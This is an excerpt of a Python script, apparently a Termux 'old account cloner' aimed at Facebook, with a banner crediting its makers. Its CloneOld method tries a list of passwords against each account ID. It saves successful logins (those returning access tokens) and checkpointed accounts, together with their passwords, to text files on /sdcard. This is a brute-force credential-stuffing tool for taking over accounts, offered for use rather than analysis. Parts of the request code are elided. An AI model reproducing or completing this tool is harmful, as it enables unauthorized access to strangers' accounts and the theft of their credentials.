...
class OLD_CLONER:
    ...
    def banner(self):
        os.system("clear")
        print("\033[38;5;46m𝑩𝑶𝑿 𝑪𝑬𝑶      : 𝑬𝑴𝑹𝑨𝑵")
        print("\033[38;5;46m𝑩𝑶𝑿 𝑨𝑫𝑴𝑰𝑵    : 𝒀𝑬𝑨𝑺𝑰𝑵")
        print("\033[38;5;46m𝑩𝑶𝑿 𝑨𝑫𝑴𝑰𝑵    : 𝑵𝑨𝑺𝑰𝑴")
        print("\033[38;5;46m𝑩𝑶𝑿 𝑨𝑫𝑴𝑰𝑵    : 𝑵𝑻 𝑪𝑶𝑹")
        print("\033[38;5;46m𝑩𝑶𝑿 𝑨𝑫𝑴𝑰𝑵    : 𝑮𝑨𝑼𝑻𝑨𝑴")
        print("\033[38;5;46m𝑩𝑶𝑿 𝑨𝑫𝑴𝑰𝑵    : 𝑻𝑶𝑵𝑴𝑶𝒀")     
        print("-------------------------------")
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mEMRAN-EHC {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                ...
                if "access_token" in response:
                    ...
                    open("/sdcard/EMRAN-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r\x1b[38;5;196mOLD-CP • {ids} • {pas}")
                    open("/sdcard/EMRAN-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
